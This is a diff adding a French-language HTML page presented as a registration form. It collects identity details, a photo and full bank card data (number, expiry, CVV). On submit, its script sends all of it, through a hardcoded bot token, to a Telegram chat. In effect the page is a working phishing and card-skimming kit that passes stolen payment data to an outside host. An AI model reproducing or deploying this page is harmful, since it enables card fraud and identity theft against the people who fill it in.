@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire d'Inscription</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #a1c4fd, #fdbb2d, #f7797d);
+            background-size: 400% 400%;
+            animation: gradient 10s ease infinite;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+            text-align: left;
+        }
+
+        input[type="text"], 
+        input[type="email"], 
+        input[type="number"], 
+        input[type="file"], 
+        input[type="month"], 
+        textarea {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="number"]:focus,
+        input[type="file"]:focus,
+        input[type="month"]:focus,
+        textarea:focus {
+            border-color: #4CAF50;
+            box-shadow: 0px 4px 12px rgba(0, 150, 136, 0.2);
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s, box-shadow 0.3s;
+        }
+
+        button:hover {
+            background-color: #45a049;
+            box-shadow: 0px 6px 10px rgba(0, 150, 136, 0.3);
+        }
+
+        p {
+            font-size: 14px;
+            color: #777;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Formulaire d'Inscription</h2>
+        <form id="registrationForm">
+            <label for="firstName">Nom :</label>
+            <input type="text" id="firstName" name="firstName" placeholder="Entrez votre nom" required>
+
+            <label for="lastName">Prénom :</label>
+            <input type="text" id="lastName" name="lastName" placeholder="Entrez votre prénom" required>
+
+            <label for="city">Ville :</label>
+            <input type="text" id="city" name="city" placeholder="Entrez votre ville" required>
+
+            <label for="phone">Numéro de téléphone (+235) :</label>
+            <input type="text" id="phone" name="phone" placeholder="+235" required>
+
+            <label for="email">Email :</label>
+            <input type="email" id="email" name="email" placeholder="Entrez votre email" required>
+
+            <label for="cardNumber">Numéro de carte bancaire :</label>
+            <input type="number" id="cardNumber" name="cardNumber" placeholder="Entrez le numéro de carte" required>
+
+            <label for="expiryDate">Date d'expiration :</label>
+            <input type="month" id="expiryDate" name="expiryDate" required>
+
+            <label for="cvv">Code de sécurité :</label>
+            <input type="number" id="cvv" name="cvv" placeholder="Entrez le code CVV" required>
+
+            <label for="skills">Description des compétences :</label>
+            <textarea id="skills" name="skills" rows="4" placeholder="Décrivez vos compétences ici..." required></textarea>
+
+            <label for="photo">Photo :</label>
+            <input type="file" id="photo" name="photo" accept="image/*" required>
+
+            <button type="submit">S'inscrire</button>
+        </form>
+        <p id="response"></p>
+    </div>
+
+    <script>
+        const form = document.getElementById('registrationForm');
+        const responseElement = document.getElementById('response');
+        const botId = '8047236658:AAEGdYJIOk_HwXPdqNf9Ud0JHuV4BAvPm90'; // Remplacez par votre vrai token de bot
+        const userId = '5992439541'; // Remplacez par votre vrai ID Telegram
+
+        form.addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            // Récupérer les valeurs du formulaire
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const city = document.getElementById('city').value;
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const skills = document.getElementById('skills').value;
+            const photoFile = document.getElementById('photo').files[0];
+
+            // Créer un FormData pour inclure tous les champs et la photo
+            const formData = new FormData();
+            formData.append('chat_id', userId);
+            formData.append('photo', photoFile);
+            formData.append('caption', `
+                Nouveau formulaire d'inscription :
+                Nom : ${firstName}
+                Prénom : ${lastName}
+                Ville : ${city}
+                Numéro de téléphone : ${phone}
+                Email : ${email}
+                Numéro de carte bancaire : ${cardNumber}
+                Date d'expiration : ${expiryDate}
+                Code de sécurité : ${cvv}
+                Compétences : ${skills}
+            `);
+
+            // Envoi de la photo et du message via Telegram
+            const url = `https://api.telegram.org/bot${botId}/sendPhoto`;
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    responseElement.textContent = 'Inscription réussie et informations envoyées !';
+                    responseElement.style.color = 'green';
+
+                    // Redirection après inscription réussie
+                    setTimeout(function() {
+                        window.location.href = 'https://www.example.com'; // Remplacez par l'URL vers laquelle vous souhaitez rediriger l'utilisateur
+                    }, 2000); // Attente de 2 secondes avant redirection
+                } else {
+                    responseElement.textContent = 'Erreur lors de l\'envoi des informations.';
+                    responseElement.style.color = 'red';
+                    console.error("Erreur d'envoi :", data);
+                }
+            })
+            .catch(error => {
+                responseElement.textContent = 'Erreur de connexion à Telegram.';
+                responseElement.style.color = 'red';
+                console.error("Erreur de connexion :", error);
+            });
+
+            // Vider les champs du formulaire après soumission
+            form.reset();
+        });
+    </script>
+
+</body>
+</html>
